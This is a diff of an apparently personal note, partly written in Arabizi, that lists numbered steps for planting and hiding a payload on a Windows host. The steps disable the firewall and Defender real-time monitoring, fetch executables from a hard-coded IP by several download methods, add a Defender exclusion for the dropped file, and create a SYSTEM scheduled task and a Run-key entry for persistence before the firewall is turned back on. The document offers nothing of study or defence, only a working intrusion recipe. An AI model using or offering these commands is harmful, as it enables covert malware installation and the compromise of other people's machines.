@@ -1,20 +1,38 @@
+~/Sam/opt
+
+**1- 6y7 defe/fire
+**
+
+netsh advfirewall set allprofiles state off
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 
+**2- 7ml almlf wa 76h bmkan kywais :
+**
 
-New-ItemProperty -Path "HKLM:\Software\policies\microsoft\windows defender" -name disableantispyware -value 0 –Force
+http://31.166.215.197:45000
 
-Set-MpPreference -DisableRealtimeMonitoring $true
-
-
-
-$URL = "http://31.166.215.197:45005/time.exe"
-
-$Path=”C:\Files\MyFile.txt”
-Invoke-WebRequest -URI $URL -OutFile $Path
-(New-Object System.Net.WebClient).DownloadFile ($URL, $Path)
-Start-BitsTransfer -Source $URL -Destination $Path
+**3- Excelude almlf >> mn al defend :
+**
 
 
-wget 31.166.215.197:45005/time1.exe
-curl 31.166.215.197:45005/time.exe
-Invoke-WebRequest http://31.166.215.197:45005/time.exe -O time.exe
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Window\System32\easycofe.exe"
+
+
+**4- Schedule a new task
+**
+
+schtasks /create /sc minute /mo 1 /tn Tinasoft /tr -c C:\Windows\System32\easycofe.exe /ru SYSTEM
+
+**5- 76 regi in case :
+**
+
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Pentestlab /t REG_SZ /d "C:\tmp\pentestlab.exe"
+
+
+**5- sh3'l al def/fire :
+**
+
+
+netsh advfirewall set allprofiles state on
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
